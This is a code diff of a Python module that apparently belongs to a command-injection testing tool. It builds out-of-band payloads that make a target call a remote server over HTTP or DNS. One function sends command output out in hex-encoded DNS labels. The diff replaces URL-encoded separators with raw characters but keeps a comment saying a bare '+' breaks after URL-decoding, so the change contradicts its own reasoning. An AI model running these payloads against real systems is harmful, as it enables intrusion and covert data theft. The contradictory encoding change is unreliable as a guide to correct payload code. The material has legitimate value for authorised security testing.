@@ -27,11 +27,11 @@ The out-of-band technique on OS command injection.
 The available out-of-band payloads.
 """
 
-PIPE = "%7c"
+PIPE = "|"
 # 'Or else', for a chain of lookup commands where only some of them exist on the target.
 OR = PIPE + PIPE
 # A bare '+' would be read as a space where the payload is URL-decoded.
-PLUS = "%2B"
+PLUS = "+"
 
 """
 The HTTP clients used to reach the out-of-band server, most common first.
@@ -128,7 +128,7 @@ def decision(separator, transport, hostname, proof="", prologue=""):
 Out-of-band decision payload for a dynamic code evaluation sink.
 """
 def decision_eval(separator, transport, hostname, proof="", prologue=""):
-  return "print(`" + prologue + reach_command(transport, hostname, proof) + "`)" + ("%3B" if separator else "")
+  return "print(`" + prologue + reach_command(transport, hostname, proof) + "`)" + (";" if separator else "")
 
 """
 Out-of-band payload that sends the output of a command back through an evaluation sink.
@@ -137,7 +137,7 @@ def exfiltrate_eval(separator, transport, hostname, cmd):
   inner = exfiltrate("", transport, hostname, cmd)
   if not inner:
     return ""
-  return "print(`" + inner + "`)" + ("%3B" if separator else "")
+  return "print(`" + inner + "`)" + (";" if separator else "")
 
 """
 The prefixes an evaluation sink is reached through, execution functions included.
@@ -234,11 +234,11 @@ def heuristic_payload(channel, target_os):
     # Both of cmd.exe's chaining operators, over the two clients that answer quickly. PowerShell
     # is left out on purpose: where a host has no way out, it holds the request open for far
     # longer than a yes/no is worth.
-    pairs = (("%26", "curl"), ("%26", "dns"), ("|", "dns"))
+    pairs = (("&", "curl"), ("&", "dns"), ("|", "dns"))
   else:
     # One HTTP client and the name lookup on both of the separators a shell chains on: a host that
     # lets nothing out over HTTP still answers through its resolver.
-    pairs = ((";", "curl"), ("%26", "dns"), ("|", "dns"))
+    pairs = ((";", "curl"), ("&", "dns"), ("|", "dns"))
   parts = []
   probes = []
   for separator, transport in pairs:
@@ -330,7 +330,7 @@ def dns_exfil_command(hostname, cmd, separator=""):
   # the label separator. 'od' and the tools around it are POSIX, so this holds outside bash as well.
   encoded = ("(" + cmd + ")" + PIPE + "od -An -v -tx1" + PIPE +
              "tr -d ' " + settings.END_LINE.ESCAPED_LF + "'")
-  if separator not in (";", "%0a", "%0d%0a"):
+  if separator not in (";", "\n", "\r\n"):
     # The name goes in through the environment and the chunk as an argument, because a BSD 'xargs'
     # will not build a replaced argument longer than 255 bytes - the lookup chain alone is more.
     return (encoded + PIPE + "fold -w" + chunk + PIPE + "cat -n" + PIPE + "tr -d ' '" + PIPE +
@@ -340,11 +340,11 @@ def dns_exfil_command(hostname, cmd, separator=""):
   # are and says so in every label - the reading end then knows when it has them all. A space after
   # the opening, or '$((' would be read as arithmetic instead of a subshell.
   return (settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.SINGLE_WHITESPACE + encoded + settings.CMD_SUB_SUFFIX + separator +
-          "t=$(( (${#" + settings.RANDOM_VAR_GENERATOR + "} %2B " + str(DNS_CHUNK - 1) + ") / " + chunk + " ))" + separator + "i=1" + separator + "n=1" + separator +
+          "t=$(( (${#" + settings.RANDOM_VAR_GENERATOR + "} + " + str(DNS_CHUNK - 1) + ") / " + chunk + " ))" + separator + "i=1" + separator + "n=1" + separator +
           "r(){ " + dns_lookup_command("$1", separator) + separator + "}" + separator +
           "while [ $i -le ${#" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator + "do " +
-          "r $n-$t.$(echo $" + settings.RANDOM_VAR_GENERATOR + "|cut -c$i-$((i%2B" + str(DNS_CHUNK - 1) + ")))." + hostname + separator +
-          "i=$((i%2B" + chunk + "))" + separator + "n=$((n%2B1))" + separator + "done")
+          "r $n-$t.$(echo $" + settings.RANDOM_VAR_GENERATOR + "|cut -c$i-$((i+" + str(DNS_CHUNK - 1) + ")))." + hostname + separator +
+          "i=$((i+" + chunk + "))" + separator + "n=$((n+1))" + separator + "done")
 
 """
 Put the pieces of a hex-encoded output back together, in the order the labels numbered them.
